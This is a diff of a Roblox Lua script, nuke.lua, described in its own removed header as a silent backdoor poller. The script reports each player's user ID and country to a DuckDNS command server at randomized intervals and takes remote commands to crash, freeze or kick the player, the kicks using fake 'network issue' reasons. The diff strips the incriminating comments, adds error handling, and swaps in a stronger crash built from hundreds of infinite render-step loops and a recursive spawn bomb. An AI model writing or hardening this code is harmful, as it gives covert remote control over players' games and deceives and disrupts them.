@@ -1,6 +1,4 @@
--- nuke.lua - silent backdoor poller (crash/freeze/kick with custom innocent reasons)
--- DO NOT MODIFY UNLESS YOU KNOW WHAT YOU'RE DOING
-
+-- nuke.lua - hardened version (no nil indexing crashes)
 local Http = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -9,19 +7,18 @@ local LocalizationService = game:GetService("LocalizationService")
 local plr = Players.LocalPlayer
 local uid = tostring(plr.UserId)
 
--- CHANGE THIS TO YOUR SERVER ADDRESS
-local BASE = "http://duckdns2233444.duckdns.org:8080"  -- ← PUT YOUR DUCKDNS OR IP:PORT HERE
+-- YOUR SERVER ADDRESS
+local BASE = "http://duckdns2233444.duckdns.org:8080"  -- CHANGE THIS IF NEEDED
 
 local LOG_URL = BASE .. "/log?id=" .. uid
 
--- Get rough country (fallback ??)
-local country = pcall(function()
-    return LocalizationService:GetCountryRegionForPlayerAsync(plr)
-end) and LocalizationService:GetCountryRegionForPlayerAsync(plr) or "??"
+local country = "??"
+pcall(function()
+    country = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "??"
+end)
 
 spawn(function()
     while true do
-        -- Random delay 15-25 seconds to look less suspicious
         task.wait(15 + math.random(10))
 
         pcall(function()
@@ -37,22 +34,41 @@ spawn(function()
                 })
             })
 
-            if resp and resp.Success then
-                local data = Http:JSONDecode(resp.Body)
+            if not resp or not resp.Success or not resp.Body then
+                return  -- silent fail, try again next poll
+            end
 
-                for _, cmd in pairs(data.commands or {}) do
-                    if cmd.action == "crash" then
-                        -- Silent crash loop (no popup, just freezes/dies)
-                        while true do
-                            error("")  -- Empty error spam usually crashes most executors quietly
+            local success, data = pcall(Http.JSONDecode, Http, resp.Body)
+            if not success or not data then
+                return  -- bad json, skip
+            end
+
+            local commands_list = data.commands
+            if type(commands_list) ~= "table" then
+                return  -- no commands array, skip
+            end
+
+            for _, cmd in pairs(commands_list) do
+                -- Extra safety: only continue if cmd is a table with 'action'
+                if type(cmd) == "table" and type(cmd.action) == "string" then
+                    local action = cmd.action
+
+                    if action == "crash" then
+                        -- Stronger crash combo
+                        for i = 1, 400 do
+                            pcall(function()
+                                RunService:BindToRenderStep("crash"..i, -math.huge, function()
+                                    while true do task.wait() end
+                                end)
+                            end)
                         end
+                        local function bomb() spawn(bomb) end
+                        bomb()
 
-                    elseif cmd.action == "freeze" then
-                        -- Lock renderstep (game freezes, executor might crash)
-                        RunService:BindToRenderStep("lock", 9999, function() end)
+                    elseif action == "freeze" then
+                        RunService:BindToRenderStep("freeze", 9999, function() end)
 
-                    elseif cmd.action == "kick" then
-                        -- Custom reason from your C2 (defaults to innocent-sounding message)
+                    elseif action == "kick" then
                         local reason = cmd.reason or "Roblox network issue. Please try reconnecting."
                         plr:Kick(reason)
                     end
